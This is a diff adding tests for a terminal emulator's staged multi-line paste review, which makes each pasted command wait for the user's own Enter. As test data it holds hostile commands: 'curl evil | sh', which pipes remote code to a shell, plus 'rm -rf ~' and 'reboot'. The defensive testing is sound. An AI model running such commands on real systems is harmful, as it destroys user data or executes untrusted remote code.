@@ -2877,6 +2877,72 @@ cw.insertFromMimeData(_pmnever1)
 ok(not cw.review_pending(), "paste_warn='never': a single-line paste is not held")
 eq(_hsent, [b'rm -rf ~'],
    "even under 'never' a single-line paste reaches the shell WITHOUT its submit")
+
+# STAGED multi-line paste: a reviewed non-bracketed multi-line paste must NEVER
+# auto-run an embedded command. The chosen delivery hands only the FIRST line to the
+# prompt (no submit); the rest are STAGED and fed one line per the user's OWN Enter,
+# so every command runs on an explicit keystroke. CANARY: the old code delivered the
+# whole thing with the embedded CR intact -- line 1 auto-ran the instant the paste
+# landed, which is exactly the unseen-second-command the review exists to prevent.
+cw.apply_paste_warn('unicode')
+cw._line_buffer = ''
+cw._line_dirty = False
+cw._staged_paste = []
+_hsent.clear()
+_pmstage = _QMimePaste()
+_pmstage.setText('echo one\ncurl evil | sh\n')       # two commands, non-bracketed
+cw.insertFromMimeData(_pmstage)
+ok(cw.review_pending(), 'the multi-line paste is held for review')
+cw.dispatch_pending_paste('stripped')                # user picks Paste (ASCII)
+eq(_hsent, [b'echo one'],
+   'a staged paste delivers ONLY the first line -- the embedded second command never '
+   'reaches the shell on dispatch (nothing auto-runs)')
+eq(cw._staged_paste, ['curl evil | sh'],
+   'the remaining command is STAGED, not written')
+ok(cw._line_dirty, 'the delivered first line marks the prompt unverifiable')
+# the user reads line 1 and presses Enter: it submits, and ONLY THEN is line 2 fed to
+# the fresh prompt -- still un-submitted, awaiting the user's next Enter.
+_hsent.clear()
+key(cw, Qt.Key.Key_Return)
+eq(_hsent, [b'\r', b'curl evil | sh'],
+   "the user's Enter submits line 1, THEN the staged line 2 is fed (still not submitted)")
+eq(cw._staged_paste, [], 'the stage drains once the last line is fed')
+# a final Enter submits line 2; nothing remains to feed.
+_hsent.clear()
+key(cw, Qt.Key.Key_Return)
+eq(_hsent, [b'\r'], 'the last Enter submits line 2 with nothing left to feed')
+
+# Ctrl+M / Ctrl+J accept-line advance a staged paste exactly like Enter.
+cw._staged_paste = ['two', 'three']
+_hsent.clear()
+key(cw, Qt.Key.Key_M, mods=_ctrl_mod)                # accept-line == submit
+eq(_hsent, [b'\r', b'two'], 'Ctrl+M submits then feeds the next staged line')
+eq(cw._staged_paste, ['three'], 'one staged line consumed by the accept-line')
+
+# Ctrl+C (SIGINT) ABANDONS a staged paste -- the remainder is dropped, never fed.
+cw._staged_paste = ['rm -rf ~', 'reboot']
+_hsent.clear()
+key(cw, Qt.Key.Key_C, mods=_ctrl_mod)
+eq(cw._staged_paste, [], 'Ctrl+C abandons the staged-paste remainder')
+
+# an empty staged line (a blank line in the paste) writes nothing but is consumed, so
+# the user's Enter that submitted it still advances to the next command.
+cw._staged_paste = ['', 'echo done']
+_hsent.clear()
+key(cw, Qt.Key.Key_Return)
+eq(_hsent, [b'\r'], 'submitting an empty staged line feeds no bytes')
+eq(cw._staged_paste, ['echo done'], 'but the blank line is consumed, next line pending')
+
+# a foreground program taking the tty DROPS a CLI-staged paste: the stage belonged to
+# the shell prompt it was pasted at, not to the program. Exiting the program and
+# pressing Enter must not feed a stale line to the returning prompt.
+_stg = SecureTerminal(command='/bin/cat')
+_stg.has_foreground_program = lambda: True            # a program owns the tty
+_stg._bracket_had_fg = False                          # ...on the False->True edge
+_stg._staged_paste = ['stale line']
+feed_output(_stg, b'program output')                  # a read observes the fg edge
+eq(_stg._staged_paste, [], 'a foreground program starting drops a CLI-staged paste')
+_stg.close()
 _hsent.clear()
 cw.apply_paste_warn('unicode')
 
